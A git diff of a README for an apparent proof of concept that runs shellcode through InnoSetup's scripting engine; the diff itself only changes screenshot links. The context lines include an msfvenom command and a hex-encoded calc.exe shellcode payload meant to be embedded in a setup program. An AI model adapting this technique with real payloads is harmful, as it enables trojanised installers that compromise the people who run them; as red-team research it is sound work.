@@ -1,6 +1,6 @@
 # InnoSetup Execute Shellcode PoC
 
-![Screenshot 2021-07-21 at 16.05.10.png](https://www.phrozen.io/media/all/Screenshot_2021-07-20_at_19.09.53.png)
+![Screenshot 2021-07-21 at 16.05.10.png](https://www.phrozen.io/media/all/Screenshot_2021-07-21_at_16.05.10.png)
 
 This proof of concept demonstrate how to take advantage of InnoSetup Scripting Engine to host local/remote process shellcode payload then execute.
 
@@ -29,13 +29,13 @@ An example with Msfvenom would be:
 
 Example: `msfvenom -p windows/exec -a x86 --platform Windows CMD=calc.exe EXITFUNC=thread -f hex`
 
-![Screenshot 2021-07-21 at 16.04.41.png](https://s3.eu-central-1.amazonaws.com/www.phrozen.io/uploads/Screenshot_2021-07-21_at_16.04.41.png)
+![Screenshot 2021-07-21 at 16.04.41.png](https://www.phrozen.io/media/all/Screenshot_2021-07-21_at_16.04.41.png)
 
 ```
 #define Payload "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbe01d2a0a68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c632e65786500"
 ```
 
-![Screenshot 2021-07-21 at 16.04.04.png](https://s3.eu-central-1.amazonaws.com/www.phrozen.io/uploads/Screenshot_2021-07-21_at_16.04.04.png)
+![Screenshot 2021-07-21 at 16.04.04.png](https://www.phrozen.io/media/all/Screenshot_2021-07-21_at_16.04.04.png)
 
 Adjust other parameters if you want/need then you can build your setup application and enjoy the result.
 
